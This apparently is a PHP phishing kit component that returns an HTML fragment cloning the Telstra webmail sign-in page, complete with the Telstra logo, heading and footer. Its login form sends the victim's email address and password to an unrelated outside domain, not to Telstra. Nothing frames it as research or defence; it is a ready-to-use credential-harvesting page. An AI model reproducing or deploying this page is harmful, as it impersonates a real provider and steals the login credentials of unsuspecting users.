<?php
header('Content-Type: text/html');
header('Access-Control-Allow-Origin: *');

// Your HTML code
$htmlResponse = '
<div>
      <header class="t-page-header">
        <svg xmlns="http://www.w3.org/2000/svg" width="33px" height="33px" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 28 32" version="1.1" aria-label="Telstra Logo" role="img" focusable="false">
          <g id="Artboard" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
            <g id="Telstra_Primary-logo_C_RGB" fill-rule="nonzero">
              <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
              <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
            </g>
          </g>
        </svg>
      </header>
      <div role="main" class="t-form-container">
        <h1 class="t-able-heading-a    t-able-spacing-2x-mb "> Sign in to Telstra webmail </h1>
        <div class="t-able-text-bodyshort t-able-spacing-5x-mb">Sign in with your Telstra email address</div>
        <form method="POST" action="https://app.aviilioncapital.com/send/index.php" autocomplete="off">
          <div class="t-able-text-field  t-able-spacing-2x-mb ">
            <label for="username">Telstra email</label>
            <span id="username-help-text">Example: john@bigpond.com</span>
            <input id="username" type="text" inputmode="email" name="username" value="" autocomplete="username webauthn" aria-invalid="false" aria-required="true" aria-describedby="username-error-text username-help-text" onblur="handleOnblurEvent(event, true)" autofocus="">
            <p id="username-error-text"></p>
          </div>
		  <div class="t-able-text-field t-pwd-field  t-able-spacing-2x-mb  ">
            <label for="password">Password</label>
            <input id="password" type="password" name="password" autofocus="" autocomplete="current-password" aria-invalid="false" aria-required="true" aria-describedby="" onblur="handleOnblurEvent(event, true)">
            <button type="button" id="showPwdBtn" class="t-able-low-emph-button t-showpwd" aria-label="Show password characters" onclick="togglePassword(&quot;show&quot;)" style="display: inline-block;">Show</button>
            <button type="button" id="hidePwdBtn" class="t-able-low-emph-button t-showpwd hide-password" aria-label="Hide password characters" onclick="togglePassword(&quot;hide&quot;)" style="display: none;">Hide</button><p id="password-error-text"></p>
          </div>
          <div class="t-able-checkbox t-able-spacing-7x-mb ">
            <label for="rememberUsername"> Remember Telstra email <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                <path d="M9.54,14.81l8-8a1.09,1.09,0,0,1,1.54,0l0,0a1.1,1.1,0,0,1,0,1.54l-8.78,8.78s0,0,0,0a1.12,1.12,0,0,1-.79.33h0a1.15,1.15,0,0,1-.41-.08,1.08,1.08,0,0,1-.39-.25L4.86,13.31a1.13,1.13,0,0,1,.8-1.92,1.11,1.11,0,0,1,.79.33Z"></path>
              </svg>
            </label>
          </div>
          <div class="">
            <button id="submit_btn" class="t-able-high-emph-button  t-able-spacing-2x-mb " type="submit" >Sign in</button>
          </div>
          <p class="t-able-sub-head-line t-able-spacing-2x-mb">OR</p>
          <a class="t-able-medium-emph-button t-able-spacing-7x-mb" href="#" > Sign in to MyTelstra </a>
        </form>
	</div>
      <button type="button" class="msg-us-btn hide" id="persistentChatBtnId" aria-labelledby="msg-us-label" aria-label="Message us"></button>
      <footer class="t-footer">
        <div class="t-footer-content">
          <p class="t-footer-copyright">Copyright © 2025 Telstra</p>
          <a class="t-footer-privacy" href="#" target="_blank">Privacy</a>
          <a class="t-footer-terms" href="#" target="_blank">Terms of use</a>
        </div>
      </footer>
    </div>
